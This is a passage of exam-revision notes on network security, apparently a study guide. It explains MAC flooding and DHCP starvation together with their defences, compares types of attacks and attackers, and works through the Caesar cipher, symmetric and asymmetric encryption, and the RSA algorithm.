    E --> F["6 . 🕵️ The attacker now sees ALL traffic<br/>on the network — passwords, emails, data"]
```

#### The impact on the switch

| Impact | Explanation |
|---|---|
| **Fail-open → acts as a hub** | The switch **floods all frames to all ports**, destroying the isolation that a switch is supposed to provide |
| **Traffic sniffing** | The attacker captures **everyone's** traffic — the main goal |
| **Performance collapse** | Every frame is broadcast, so bandwidth and CPU are wasted network-wide |
| **Denial of Service** | Legitimate MAC entries are evicted, causing connectivity problems |
| **Enables further attacks** | Sniffed credentials lead to MITM, session hijacking and lateral movement |

> ### "How does the attacker benefit?"
> The attacker converts a **secure switched network back into an insecure shared network**. On a normal switch they would see only their own traffic; after MAC flooding they can **passively capture every packet on the VLAN** — plaintext passwords, FTP and Telnet sessions, internal emails, database queries and session cookies — without the victims noticing anything except a slow network.

**Prevention of MAC flooding**

| Measure | How it helps |
|---|---|
| **Port Security** (the primary defence) | Limit the number of MAC addresses learned per port (e.g. `switchport port-security maximum 2`) and shut down / restrict / protect the port when exceeded |
| **Sticky MAC learning** | The first learned MAC is bound permanently to the port |
| **802.1X port authentication** | Only authenticated devices may use a port |
| **VLAN segmentation** | Confines the damage to one small broadcast domain |
| **MAC address filtering / static entries** | For servers and critical hosts |
| **Storm control and rate limiting** | Caps the frame rate per port |
| **Monitoring** | Alert on rapid CAM table growth or MAC flapping |
| **Encryption** | Even sniffed traffic is useless if it is encrypted |
| **Disable unused ports** | Removes the attacker's entry point |

#### DHCP starvation

**DHCP starvation** is a Denial-of-Service attack in which an attacker **requests every available IP address from the DHCP server** using **spoofed MAC addresses**, until the DHCP pool is **exhausted** and no legitimate device can obtain an address.

```mermaid
flowchart TD
    A["1 . The attacker broadcasts thousands of<br/>DHCP DISCOVER messages, each with a<br/>DIFFERENT spoofed MAC address"] --> B["2 . The DHCP server treats each as a new<br/>client and OFFERS an IP address"]
    B --> C["3 . The attacker REQUESTS every offer<br/>and holds the leases"]
    C --> D["4 . The DHCP address POOL IS EXHAUSTED"]
    D --> E["5 . ❌ Legitimate devices get NO IP address<br/>and cannot join the network — DoS"]
    D --> F["6 . 🕵️ The attacker now starts a ROGUE<br/>DHCP server of their own"]
    F --> G["7 . New clients get the attacker's IP as<br/>their GATEWAY and DNS server"]
    G --> H["8 . ➡️ Full MAN-IN-THE-MIDDLE"]
```

**The two stages — and why the second matters more:** starvation alone is just a denial of service. Its real purpose is usually to **clear the field for a ROGUE DHCP SERVER**. Once the legitimate server has no addresses left, the attacker's own DHCP server answers every new request, handing out configurations that name **the attacker's machine as the default gateway and DNS server** — giving a complete, silent man-in-the-middle position over every newly connected device.

**Related attacks in this family:** **rogue DHCP server**, **DHCP spoofing**, and **DHCP-based MITM**. *(A "DHCP attack in MITM" question is asking exactly this chain: starve the real server, then impersonate it.)*

**Prevention of DHCP starvation**

| Measure | How it helps |
|---|---|
| **DHCP Snooping** (the primary defence) | The switch marks uplink ports to the real DHCP server as **trusted** and all access ports as **untrusted**; DHCP OFFER/ACK messages arriving on an untrusted port are **dropped**, killing rogue servers |
| **Port Security** | Limits MAC addresses per port, so an attacker cannot present thousands of fake MACs |
| **DHCP rate limiting** | Caps DHCP messages per second per port |
| **IP Source Guard** | Uses the DHCP snooping binding table to block spoofed source IPs |
| **Dynamic ARP Inspection** | Uses the same binding table to stop the follow-on ARP spoofing |
| **802.1X** | Only authenticated devices reach the DHCP service at all |
| **Static IP / reservations** for critical devices | They are unaffected by pool exhaustion |
| **Monitoring** | Alert on abnormal DHCP request rates and on unexpected DHCP servers |

**Previous Year Question List from this Topic:**

- [What is MAC flooding? How to prevent MAC flooding?](../written-answers/computer-network-security.md?plain=1#L454)
- [What is DHCP starvation and how DHCP starvation work with diagram? Write down the related attack introduced by DHCP starvation?](../written-answers/computer-network-security.md?plain=1#L596)
- [What is MAC flooding attack? What is the impact of this switch?](../written-answers/computer-network-security.md?plain=1#L628)
- [(b) What is DHCP Starvation Attack? Explain briefly.](../written-answers/computer-network-security.md?plain=1#L900)
- [What is MAC Flood in Switch? How attacker gets benefitted from it?](../written-answers/computer-network-security.md?plain=1#L966)
- [How to attack DHCP server in MIMA?](../written-answers/computer-network-security.md?plain=1#L216)


---

### Active vs Passive Attacks, and Types of Attacker

#### Passive attacks

A **passive attack** attempts to **learn or make use of information from the system but does NOT affect system resources**. The attacker only **listens**.

| Type | Description |
|---|---|
| **Eavesdropping / Sniffing** | Capturing traffic to read message contents |
| **Traffic analysis** | Even if the content is encrypted, observing **who talks to whom, how often, how much and when** reveals a great deal |
| **Shoulder surfing, footprinting, reconnaissance** | Passive information gathering |

#### Active attacks

An **active attack** attempts to **alter system resources or affect their operation**. The attacker **modifies, injects, deletes or disrupts**.

| Type | Description |
|---|---|
| **Masquerade / Spoofing** | Pretending to be a different entity |
| **Replay** | Capturing a valid message and re-sending it later |
| **Modification of messages** | Altering the content in transit |
| **Denial of Service** | Preventing legitimate use |
| **Malware injection, SQL injection, MITM with alteration, session hijacking** | |

#### The comparison

| Point | **Passive Attack** | **Active Attack** |
|---|---|---|
| **Action** | **Only observes / listens** | **Modifies, injects or disrupts** |
| **Data modified?** | ❌ **No** | ✅ **Yes** |
| **System resources affected?** | ❌ No | ✅ Yes |
| **Which CIA property is violated** | **Confidentiality** | **Integrity and/or Availability** |
| **Detection** | **Very difficult** — it leaves no trace | **Easier** — the damage or anomaly is visible |
| **Prevention** | **Possible** — mainly through **encryption** | **Difficult to prevent**; the emphasis is on **detection and recovery** |
| **Main strategy** | **PREVENT** it (encrypt everything) | **DETECT** it and recover quickly |
| **Harm to the victim** | Loss of privacy/secrets | Direct damage, corruption or downtime |
| **Examples** | Eavesdropping, sniffing, traffic analysis, reconnaissance | DoS, MITM with alteration, masquerade, replay, SQL injection, malware |

#### Spoofing vs Sniffing

| Point | **Spoofing** | **Sniffing** |
|---|---|---|
| **Nature** | **ACTIVE** attack | **PASSIVE** attack |
| **What it does** | **Pretends to be someone else** — forges an identity (IP, MAC, email, caller ID, website) | **Captures and reads** traffic passing over the network |
| **Modifies data?** | ✅ Yes — falsifies headers/identity | ❌ No — only listens and copies |
| **Detection** | Moderately detectable | **Very hard to detect** |
| **Goal** | Gain **unauthorised access** or misdirect traffic | Gain **information** — passwords, data |
| **CIA violated** | **Integrity / Authentication** | **Confidentiality** |
| **Tools** | hping, Ettercap, custom packet crafting | **Wireshark, tcpdump**, Ettercap |
| **Defence** | Authentication, digital signatures, **ingress filtering**, DAI, DNSSEC | **Encryption (HTTPS, VPN, SSH)**, switched networks, port security |
| **Types** | IP spoofing, **MAC spoofing**, **ARP spoofing**, **DNS spoofing**, email spoofing, caller-ID spoofing | Passive sniffing (on a hub), active sniffing (after MAC flooding or ARP spoofing) |

> **They are often combined:** the attacker **spoofs** (ARP spoofing) in order to **sniff** — spoofing puts them in the path, sniffing extracts the value.

#### What is a spoofed packet?

A **spoofed packet** is a network packet whose **source address field has been deliberately falsified** so that it appears to come from a different, usually trusted, machine.

**Why attackers use it:**
1. **Hide their identity** — the victim's logs record the forged address, not the attacker's.
2. **Bypass IP-based access controls** — pretend to be an internal or whitelisted host.
3. **Launch amplification/reflection DDoS** — put the **victim's** IP as the source so that thousands of servers send their large replies to the victim (DNS and NTP amplification, the **Smurf attack**).
4. **SYN flooding** — the spoofed source means the SYN-ACK goes nowhere and the connection stays half-open.
5. **Session hijacking and TCP sequence prediction** — inject packets into an established session.
6. **Blind attacks** on trust relationships (the classic Mitnick attack).

**Defences:** **ingress/egress filtering (BCP 38)** at the ISP and network edge — reject packets whose source address could not legitimately come from that direction; **reverse path forwarding (uRPF)** checks; **authentication rather than IP-based trust**; **IPsec** and TLS; randomised TCP initial sequence numbers; and firewall/IDS anomaly detection.

#### Types of hacker

| Type | Motivation | Authorisation | Legality |
|---|---|---|---|
| **White Hat** (ethical hacker) | **Improve security** | ✅ **Authorised** — hired and given written permission | ✅ **Legal** |
| **Black Hat** (cracker) | **Personal gain, damage, theft, espionage** | ❌ **None** | ❌ **Illegal — criminal** |
| **Grey Hat** | **Curiosity, reputation**; often discloses the flaw afterwards, sometimes demanding a fee | ❌ **None**, but no malicious intent | ⚠️ **Still illegal** — good intentions do not make unauthorised access lawful |

| Point | **White Hat** | **Grey Hat** | **Black Hat** |
|---|---|---|---|
| **Permission** | ✅ Yes, in writing | ❌ No | ❌ No |
| **Intent** | Defensive, constructive | Mixed — usually non-malicious | **Malicious** |
| **Reports the flaw?** | ✅ Always, to the owner | ⚠️ Usually, but publicly or for a fee | ❌ No — **exploits or sells** it |
| **Causes harm?** | No | Usually not, but risks it | **Yes** |
| **Legal status** | Legal | **Illegal** | **Illegal** |
| **Also known as** | Ethical hacker, penetration tester | — | Cracker, cyber criminal |
| **Example** | A bank hires a firm to penetration-test its app | Someone scans a company's server uninvited, finds a bug and emails them | Someone steals a customer database and sells it |

> **Other categories:** **Blue Hat** (an outside expert invited to test before a product launch, or an attacker motivated by revenge) · **Red Hat** (vigilantes who attack black hats) · **Script Kiddie** (an unskilled attacker using ready-made tools) · **Hacktivist** (politically motivated) · **State-sponsored / APT** (government-backed espionage groups) · **Insider threat** (a current or former employee).

> **"Hacking a system without cracking it, only to find bugs and vulnerabilities" is called ETHICAL HACKING / PENETRATION TESTING**, performed by a **White Hat hacker** under written authorisation.

**Previous Year Question List from this Topic:**

- [Write down the 10 most Cyber attacks. Difference among Black Hat hacker, Grey hat hacker and white hat hacker.](../written-answers/computer-network-security.md?plain=1#L310)
- [Difference between active and passive atack.](../written-answers/computer-network-security.md?plain=1#L393)
- [Write down the difference between Active and Passive attack.](../written-answers/computer-network-security.md?plain=1#L566)
- [Difference between spoofing and sniffing](../written-answers/computer-network-security.md?plain=1#L781)
- [Which security attacks (given) occur on client side or server side?](../written-answers/computer-network-security.md?plain=1#L802)
- [What is a spoofed packet, and how can it be used in network attacks?](../written-answers/computer-network-security.md?plain=1#L4246)
- [Hacking a system without cracking the system, only for finding bugs and vulgarities is called?](../written-answers/computer-network-security.md?plain=1#L4752)


---

### The Major Cyber Attacks — A Master List

*(Several questions ask simply for "the top 10 cyber attacks" or "ten attacks through the internet". Learn this list with one line each.)*

| # | Attack | One-line description |
|---|---|---|
| 1 | **Phishing** | Fraudulent messages tricking the victim into revealing credentials |
| 2 | **Malware** (virus, worm, trojan, spyware) | Malicious software that damages, steals or takes control |
| 3 | **Ransomware** | Encrypts the victim's files and demands payment for the key |
| 4 | **DoS / DDoS** | Floods a service so that it becomes unavailable |
| 5 | **Man-in-the-Middle (MITM)** | Intercepts and possibly alters communication between two parties |
| 6 | **SQL Injection** | Malicious SQL entered into an input field to read or destroy a database |
| 7 | **Cross-Site Scripting (XSS)** | Injects malicious JavaScript into a web page viewed by other users |
| 8 | **Cross-Site Request Forgery (CSRF)** | Tricks a logged-in user's browser into performing an unwanted action |
| 9 | **Password attacks** (brute force, dictionary, credential stuffing, rainbow table) | Guessing or cracking credentials |
| 10 | **Zero-day exploit** | Attacks a vulnerability before a patch exists |
| 11 | **Social engineering** | Manipulating people rather than machines |
| 12 | **Insider threat** | Abuse by an employee or contractor |
| 13 | **DNS spoofing / poisoning** | Redirects users to a fake site |
| 14 | **ARP spoofing** | LAN-level redirection enabling MITM |
| 15 | **Session hijacking** | Stealing a session token to impersonate a logged-in user |
| 16 | **Supply chain attack** | Compromising a trusted vendor or software update (SolarWinds) |
| 17 | **Advanced Persistent Threat (APT)** | A long-term, stealthy, state-level intrusion |
| 18 | **Cryptojacking** | Secretly using the victim's hardware to mine cryptocurrency |
| 19 | **Buffer overflow** | Overwriting memory to execute the attacker's code |
| 20 | **Eavesdropping / packet sniffing** | Passively capturing network traffic |
| 21 | **Drive-by download** | Malware installed merely by visiting a compromised page |
| 22 | **Watering hole attack** | Compromising a site the target group frequently visits |
| 23 | **Botnet / IoT attack** | Hijacking thousands of devices for coordinated attacks |
| 24 | **Rogue Wi-Fi / Evil twin** | A fake access point that intercepts everything |
| 25 | **Spoofing** (IP, MAC, email, caller ID) | Forging an identity to gain trust or access |

#### Client-side vs server-side attacks

| Side | Meaning | Examples |
|---|---|---|
| **Client-side** | The attack executes **in the user's browser or on the user's machine** | **XSS** (the script runs in the victim's browser), **CSRF**, clickjacking, drive-by download, malicious browser extensions, phishing, malware on the endpoint |
| **Server-side** | The attack executes **on the web/application server** | **SQL injection**, command injection, file inclusion (LFI/RFI), server-side request forgery (SSRF), path traversal, insecure deserialisation, DoS against the server, buffer overflow on the server |

> **The classic pair:** **SQL Injection is server-side** (the malicious SQL runs in the database server), while **XSS is client-side** (the malicious JavaScript runs in other users' browsers). This distinction is a favourite short question.

**Previous Year Question List from this Topic:**

- [Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps w…](../written-answers/computer-network-security.md?plain=1#L250)
- [Write down the 10 most Cyber attacks. Difference among Black Hat hacker, Grey hat hacker and white hat hacker.](../written-answers/computer-network-security.md?plain=1#L310)
- [What is Cyber Security? Write down the top 10 cyber attack. Discuss about Ransomware and DDoS attack.](../written-answers/computer-network-security.md?plain=1#L341)
- [What is meant by Encryption and Decryption? What is Cyber security? Write down the top 10 cyber attack.](../written-answers/computer-network-security.md?plain=1#L370)
- [Which security attacks (given) occur on client side or server side?](../written-answers/computer-network-security.md?plain=1#L802)
- [Write down ten name of different attack through internet.](../written-answers/computer-network-security.md?plain=1#L836)
- [Write down the name of different attack through internet.](../written-answers/computer-network-security.md?plain=1#L920)

## Cryptography

### Cryptography, Encryption and Decryption

**Cryptography** is the science of **securing information by transforming it into an unreadable form**, so that only the intended recipient can read it. The word comes from the Greek *kryptos* (hidden) + *graphein* (writing).

#### The basic terminology

| Term | Meaning |
|---|---|
| **Plaintext** | The **original, readable** message |
| **Ciphertext** | The **encrypted, unreadable** message |
| **Encryption** | The process of converting **plaintext → ciphertext** |
| **Decryption** | The process of converting **ciphertext → plaintext** |
| **Key** | The secret value that controls the encryption/decryption |
| **Cipher / Algorithm** | The mathematical procedure used |
| **Cryptanalysis** | The science of **breaking** ciphers |
| **Cryptology** | Cryptography + Cryptanalysis |

```mermaid
flowchart LR
    P["PLAINTEXT<br/>'Transfer 50000 to A/C 1234'"] --> E["ENCRYPTION<br/>algorithm"]
    K1["🔑 Key"] --> E
    E --> C["CIPHERTEXT<br/>'8f3a9b2e7c1d4f6a…'"]
    C -->|"transmitted over an<br/>insecure network"| D["DECRYPTION<br/>algorithm"]
    K2["🔑 Key"] --> D
    D --> P2["PLAINTEXT<br/>'Transfer 50000 to A/C 1234'"]
```

#### Plaintext vs Ciphertext

| Point | **Plaintext** | **Ciphertext** |
|---|---|---|
| **Meaning** | The **original readable** message | The **encrypted unreadable** message |
| **Readability** | Understandable by anyone | **Meaningless** without the key |
| **Form** | Normal text, numbers, images, files | A scrambled sequence of bytes |
| **Security** | ❌ **None** — anyone who intercepts it can read it | ✅ **Secure** — useless to an interceptor |
| **Produced by** | The original author | The **encryption** algorithm |
| **Converted to the other by** | **Encryption** (using a key) | **Decryption** (using a key) |
| **Example** | `HELLO` | `KHOOR` (Caesar cipher, shift 3) |
| **Storage/transmission** | Never over an untrusted channel | Safe to transmit |

#### The five goals of cryptography

| Goal | Meaning | Achieved by |
|---|---|---|
| **Confidentiality** | Only the intended recipient can read it | **Encryption** |
| **Integrity** | The message has not been altered | **Hashing, MAC** |
| **Authentication** | The sender is who they claim to be | **Digital signature, MAC, certificates** |
| **Non-repudiation** | The sender cannot deny having sent it | **Digital signature** |
| **Access control** | Only authorised parties can use the resource | Keys + authorisation systems |

#### A worked example — the Caesar cipher

The **Caesar cipher** is a **shift cipher**: each letter is replaced by the letter **k positions further along** the alphabet, wrapping around at Z.

> **Encryption: C = (P + k) mod 26**
> **Decryption: P = (C − k) mod 26**
> where letters are numbered A = 0, B = 1, … Z = 25, and **k** is the key (the shift).

**Encrypting `HELLO` with k = 3:**

| Letter | P (number) | (P + 3) mod 26 | Ciphertext letter |
|---|---|---|---|
| H | 7 | 10 | **K** |
| E | 4 | 7 | **H** |
| L | 11 | 14 | **O** |
| L | 11 | 14 | **O** |
| O | 14 | 17 | **R** |

> **Ciphertext = `KHOOR`**

**Decrypting `KHOOR` with k = 3:** K(10) − 3 = 7 = H · H(7) − 3 = 4 = E · O(14) − 3 = 11 = L · O → L · R(17) − 3 = 14 = O → **`HELLO`** ✅

**The wrap-around:** encrypting **Z (25)** with k = 3 gives (25 + 3) mod 26 = 28 mod 26 = **2 = C**.

**Why it is insecure:** there are only **25 possible keys**, so a **brute-force attack** tries them all in a fraction of a second. It is also trivially broken by **frequency analysis**, because the letter frequencies of the plaintext are preserved. It is of **historical and educational value only**.

#### Classical cipher techniques

| Technique | Idea | Example |
|---|---|---|
| **Substitution** | Each symbol is **replaced** by another | Caesar, Monoalphabetic, **Playfair**, **Vigenère**, Hill |
| **Transposition** | The symbols are **rearranged**, not replaced | Rail Fence, Columnar transposition |
| **Product cipher** | Both, applied in multiple rounds | **DES, AES** |

**Modern ciphers by how they process data:**
- **Block cipher** — encrypts **fixed-size blocks** (DES: 64 bits; AES: 128 bits). Modes: ECB, **CBC, CTR, GCM**.
- **Stream cipher** — encrypts **one bit or byte at a time** (RC4, ChaCha20, A5/1). Fast, used where data arrives continuously.

#### The role of encryption in security

1. **Confidentiality of data in transit** — HTTPS/TLS, VPN, SSH, encrypted email.
2. **Confidentiality of data at rest** — full-disk encryption (BitLocker, LUKS), database and file encryption.
3. **Authentication** — proving identity through certificates and digital signatures.
4. **Integrity** — detecting any alteration (through authenticated encryption, GCM).
5. **Non-repudiation** — a signed transaction cannot be denied.
6. **Regulatory compliance** — PCI-DSS, GDPR and Bangladesh Bank guidelines **mandate** encryption of cardholder and customer data.
7. **Secure key exchange** over insecure channels (Diffie-Hellman, RSA).
8. **Protection against data breach** — stolen encrypted data is worthless without the keys.
9. **Enabling e-commerce and digital banking** — without encryption, online payment would be impossible.
10. **Secure backups** — protects data even if the tapes or cloud copies are stolen.

**Previous Year Question List from this Topic:**

- [Explain the concepts of encryption and decryption with an example.](../written-answers/computer-network-security.md?plain=1#L1014)
- [What is Encryption? What are the types? Explain the role of Encryption in security.](../written-answers/computer-network-security.md?plain=1#L1068)
- [What is Cryptography? Difference between Symmetric and Asymmetric encryption with example. Draw and design public key encryption using Hash function. Draw a dia…](../written-answers/computer-network-security.md?plain=1#L1326)
- [(খ) Plaintext ও Cipher text এর পার্থক্য লিখুন।](../written-answers/computer-network-security.md?plain=1#L1515)
- [(a) What is meant by Encryption and Decryption?](../written-answers/computer-network-security.md?plain=1#L1592)
- [The Caesar Cipher is a type of shift cipher. Shift Ciphers work by using the modulo operator to encrypt and decrypt messages. The Shift Cipher has a key K, whic…](../written-answers/computer-network-security.md?plain=1#L1671)
- [(গ) Plain Text and Cipher Text-এর মধ্যে মূল পার্থক্য কী? লিখুন।](../written-answers/computer-network-security.md?plain=1#L1750)
- [(ক) Data encryption বলতে কী বোঝায়? বহুল ব্যবহৃত কয়েকটি encryption পদ্ধতির নাম লিখুন।](../written-answers/computer-network-security.md?plain=1#L1770)


---

### Symmetric vs Asymmetric Encryption

#### Symmetric (secret-key / private-key) encryption

**ONE single shared key** is used for **both encryption and decryption**. Both parties must know the same secret key.

```mermaid
flowchart LR
    P["Plaintext"] --> E["Encrypt"]
    K["🔑 SHARED SECRET KEY"] --> E
    E --> C["Ciphertext"]
    C --> D["Decrypt"]
    K --> D
    D --> P2["Plaintext"]
```

**Algorithms:** **AES** (Advanced Encryption Standard — 128/192/256-bit, the current standard), **DES** (56-bit, broken), **3DES**, **Blowfish, Twofish, RC4, RC5, IDEA, ChaCha20**.

> **Two symmetric key algorithms to name in an exam: AES and DES** (or Blowfish, 3DES).

#### Asymmetric (public-key) encryption

**TWO mathematically related keys** are used — a **public key** (shared with everyone) and a **private key** (kept absolutely secret). **What one key encrypts, only the other can decrypt.**

```mermaid
flowchart LR
    subgraph CONF["For CONFIDENTIALITY — encrypt to the recipient"]
        P1["Plaintext"] --> E1["Encrypt"]
        PK1["🔓 Receiver's PUBLIC key"] --> E1
        E1 --> C1["Ciphertext"]
        C1 --> D1["Decrypt"]
        SK1["🔐 Receiver's PRIVATE key"] --> D1
        D1 --> P1B["Plaintext"]
    end
    subgraph AUTH["For AUTHENTICATION — digital signature"]
        P2["Message"] --> E2["Sign"]
        SK2["🔐 Sender's PRIVATE key"] --> E2
        E2 --> S["Signature"]
        S --> D2["Verify"]
        PK2["🔓 Sender's PUBLIC key"] --> D2
        D2 --> OK["✅ Authentic"]
    end
```

> **The two directions — memorise this table, it answers several questions at once:**
>
> | Goal | Encrypt/Sign with | Decrypt/Verify with |
> |---|---|---|
> | **Confidentiality** (only the receiver can read it) | The **RECEIVER'S PUBLIC key** | The **RECEIVER'S PRIVATE key** |
> | **Authentication / Digital signature** (prove who sent it) | The **SENDER'S PRIVATE key** | The **SENDER'S PUBLIC key** |
>
> ### "What type of key is used to decrypt a message in PKI?"
> **The RECIPIENT'S PRIVATE KEY.** The sender encrypts with the recipient's *public* key; only the matching *private* key — which never leaves the recipient — can decrypt it.

**Algorithms:** **RSA**, **Diffie-Hellman** (key exchange only), **ECC** (Elliptic Curve Cryptography), **DSA**, **ElGamal**.

#### The comparison — the single most asked table in this topic

| Point | **Symmetric Encryption** | **Asymmetric Encryption** |
|---|---|---|
| **Number of keys** | **ONE** shared secret key | **TWO** — a public/private key **pair** |
| **Same key for both operations?** | ✅ **Yes** | ❌ **No** |
| **Key distribution** | ❌ **The major problem** — how do you share the secret key securely in the first place? | ✅ **Solved** — the public key can be published openly |
| **Speed** | **Very FAST** — 100 to 1000× faster | **SLOW** — heavy mathematics on very large numbers |
| **Suitable for** | **Bulk data** — files, disks, streaming, large messages | **Small data** — keys, hashes, signatures |
| **Key length** | 128 / 192 / **256 bits** | **2048 / 4096 bits** (RSA); 256 bits (ECC) |
| **Number of keys for n users** | **n(n−1)/2** — grows quadratically, unmanageable at scale | **2n** — one pair per user |
| **Confidentiality** | ✅ Yes | ✅ Yes |
| **Authentication / Non-repudiation** | ❌ **No** — both parties hold the same key, so either could have created the message | ✅ **Yes** — only the owner holds the private key |
| **Computational cost** | Low | **High** |
| **Algorithms** | **AES, DES, 3DES, Blowfish, RC4, IDEA** | **RSA, ECC, Diffie-Hellman, DSA, ElGamal** |
| **Also called** | Secret-key, private-key, shared-key | Public-key cryptography |
| **Example use** | Encrypting a 2 GB database backup; the actual data inside a TLS session | Exchanging the TLS session key; signing a document; SSL certificates |

#### Private key vs Public key

| Point | **Private Key** | **Public Key** |
|---|---|---|
| **Who holds it** | **ONLY the owner** | **Everyone** — it is published freely |
| **Secrecy** | **Absolutely secret** | **Not secret at all** |
| **Used to** | **Decrypt** messages sent to you; **SIGN** your messages | **Encrypt** messages to that person; **VERIFY** their signature |
| **Distribution** | Never distributed | Distributed via **digital certificates / a directory** |
| **If compromised** | **Catastrophic** — identity is stolen, all past traffic may be readable | No impact — it was already public |
| **Stored in** | A protected key store, an HSM, a smart card | A certificate, published by a CA |

#### The hybrid approach — how TLS/HTTPS actually works

Neither system alone is ideal: symmetric is fast but cannot distribute keys; asymmetric solves key distribution but is far too slow for bulk data. **Real systems use BOTH.**

```mermaid
flowchart TD
    A["1 . Client connects to the server (HTTPS)"] --> B["2 . The server sends its DIGITAL CERTIFICATE<br/>containing its PUBLIC key"]
    B --> C["3 . The client verifies the certificate<br/>against a trusted Certificate Authority"]
    C --> D["4 . ASYMMETRIC step — the client generates a random<br/>SYMMETRIC session key and encrypts it with the<br/>SERVER'S PUBLIC KEY (or uses Diffie-Hellman)"]
    D --> E["5 . Only the server's PRIVATE key can decrypt it —<br/>both sides now share the session key"]
    E --> F["6 . SYMMETRIC step — ALL further data is encrypted<br/>with fast AES using that session key"]
```

> **In one line:** *asymmetric cryptography is used to securely exchange a symmetric key; symmetric cryptography then does all the actual work.* This is the design of **TLS/HTTPS, SSH, PGP and VPNs**.

**Previous Year Question List from this Topic:**

- [What type of key used for decrypt message of PKI?](../written-answers/computer-network-security.md?plain=1#L1152)
- [Breifly Explain Asymmetric encryption.](../written-answers/computer-network-security.md?plain=1#L1191)
- [Distinguish between Symmetric Encryption and Asymmetric Encryption. Give some examples of encryption algorithm. What are the different types of ciphers in crypt…](../written-answers/computer-network-security.md?plain=1#L1221)
- [What is Symmetric and Asymmetric Encryption? Explain with example.](../written-answers/computer-network-security.md?plain=1#L1271)
- [What is symmetric and Asymmetric key explain with example?](../written-answers/computer-network-security.md?plain=1#L1303)
- [What is Cryptography? Difference between Symmetric and Asymmetric encryption with example. Draw and design public key encryption using Hash function. Draw a dia…](../written-answers/computer-network-security.md?plain=1#L1326)
- [Difference between symmetric and asymetric key encryption.](../written-answers/computer-network-security.md?plain=1#L1416)
- [অথবা, (ক) Private key এবং Public key উদাহরণসহ ব্যাখ্যা করুন।](../written-answers/computer-network-security.md?plain=1#L1483)
- [(ii) Symmetric Key Encryption and Asymmetric Key Encryption ব্যাখ্যা করুন।](../written-answers/computer-network-security.md?plain=1#L1569)
- [Difference between private key and public key.](../written-answers/computer-network-security.md?plain=1#L1612)
- [Write two symmetric key algorithm name.](../written-answers/computer-network-security.md?plain=1#L1633)
- [(b) Describe secret key and public key encryption.](../written-answers/computer-network-security.md?plain=1#L1646)
- [Public key cryptography কীভাবে কাজ করে?](../written-answers/computer-network-security.md?plain=1#L1720)
- [What is public key encryption? Explain digital signature with example.](../written-answers/computer-network-security.md?plain=1#L1800)


---

### The RSA Algorithm

**RSA** — named after its inventors **Rivest, Shamir and Adleman (1977)** — is the most widely used **asymmetric (public-key)** algorithm. Its security rests on the fact that **multiplying two large primes is easy, but factoring the product back into those primes is computationally infeasible**.

#### Key generation

| Step | Operation |
|---|---|
| 1 | Choose two large **distinct prime numbers** **p** and **q** (in practice, 1024+ bits each) |
| 2 | Compute **n = p × q** — this is the **modulus**, and its bit length is the "RSA key size" |
| 3 | Compute **φ(n) = (p − 1)(q − 1)** — Euler's totient |
| 4 | Choose **e** such that **1 < e < φ(n)** and **gcd(e, φ(n)) = 1** — commonly **e = 65537** |
| 5 | Compute **d** such that **(d × e) mod φ(n) = 1** — d is the modular multiplicative inverse of e |
| 6 | **Public key = (e, n)** · **Private key = (d, n)** · **Destroy p, q and φ(n)** |

#### Encryption and decryption

> **Encryption: C = Pᵉ mod n** (using the receiver's **public** key)
> **Decryption: P = Cᵈ mod n** (using the receiver's **private** key)

#### A complete worked example with small numbers

**Step 1 — choose primes:** p = **7**, q = **11**

**Step 2 — compute n:** n = 7 × 11 = **77**

**Step 3 — compute φ(n):** φ(n) = (7 − 1)(11 − 1) = 6 × 10 = **60**

**Step 4 — choose e:** we need gcd(e, 60) = 1. Try e = **13** → gcd(13, 60) = 1 ✅

**Step 5 — compute d** such that (d × 13) mod 60 = 1:
- Try d = 37: 37 × 13 = 481; 481 mod 60 = 481 − 480 = **1** ✅
- So **d = 37**

**The keys:** **Public key = (e, n) = (13, 77)** · **Private key = (d, n) = (37, 77)**

**Step 6 — encrypt the message P = 5:**
> C = 5¹³ mod 77
> 5² = 25 · 5⁴ = 25² = 625 mod 77 = 625 − 616 = **9** · 5⁸ = 9² = 81 mod 77 = **4**
> 5¹³ = 5⁸ × 5⁴ × 5¹ = 4 × 9 × 5 = 180 mod 77 = 180 − 154 = **26**
> **Ciphertext C = 26**

**Step 7 — decrypt C = 26:**

> P = 26³⁷ mod 77

Use **repeated squaring** (write 37 = 32 + 4 + 1):

| Power | Working | Result mod 77 |
|---|---|---|
| 26¹ | — | **26** |
| 26² | 26 × 26 = 676; 676 − (77 × 8 = 616) | **60** |
| 26⁴ | 60² = 3600; 3600 − (77 × 46 = 3542) | **58** |
| 26⁸ | 58² = 3364; 3364 − (77 × 43 = 3311) | **53** |
| 26¹⁶ | 53² = 2809; 2809 − (77 × 36 = 2772) | **37** |
| 26³² | 37² = 1369; 1369 − (77 × 17 = 1309) | **60** |

> 26³⁷ = 26³² × 26⁴ × 26¹ = 60 × 58 × 26 mod 77
> 60 × 58 = 3480; 3480 − (77 × 45 = 3465) = **15**
> 15 × 26 = 390; 390 − (77 × 5 = 385) = **5**

> ### ✅ **Decrypted P = 5** — exactly the original message. The round trip works.

*(A smaller set that is quicker to compute under exam pressure: **p = 3, q = 11 → n = 33, φ = 20, e = 7, d = 3**. Encrypting P = 2 gives C = 2⁷ mod 33 = 128 mod 33 = **29**; decrypting gives 29³ mod 33 = 24389 mod 33 = **2** ✅)*

#### Why RSA is secure

The public key reveals **n** and **e**. To find the private key **d**, an attacker must compute **φ(n) = (p−1)(q−1)**, which requires **factoring n back into p and q**. For a 2048-bit n, the best known algorithms would take **longer than the age of the universe** on all the computers on Earth.

#### Uses and limitations

**Uses:** **SSL/TLS certificates and HTTPS** · **digital signatures** · secure key exchange · **PGP/GPG** email encryption · SSH authentication · code signing · e-tender and e-banking authentication.

**Limitations:** **very slow** for bulk data — used only for small payloads and key exchange · needs **large keys** (2048 bits minimum, 3072+ recommended) · vulnerable if **poor random primes** are chosen · requires **padding (OAEP)** to be secure in practice · and it is **breakable by a future quantum computer** running **Shor's algorithm**, which is why post-quantum cryptography is being standardised.

**RSA vs ECC:** Elliptic Curve Cryptography gives **equivalent security with far smaller keys** — a **256-bit ECC key ≈ a 3072-bit RSA key** — making it much faster and better suited to mobile and IoT devices.

**Previous Year Question List from this Topic:**

- [Describe RSA Algorithm and how it works?](../written-answers/computer-network-security.md?plain=1#L1451)
- [Identify the type of algorithm? (i) MD5 (ii) AES (iii) RSA (iv) Diffie-Hellman](../written-answers/computer-network-security.md?plain=1#L1435)


---

### Hashing, and How It Differs from Encryption

#### What is hashing?

**Hashing** is the process of converting an input of **any size** into a **fixed-size string of characters (a hash / message digest / fingerprint)** using a **one-way mathematical function**.

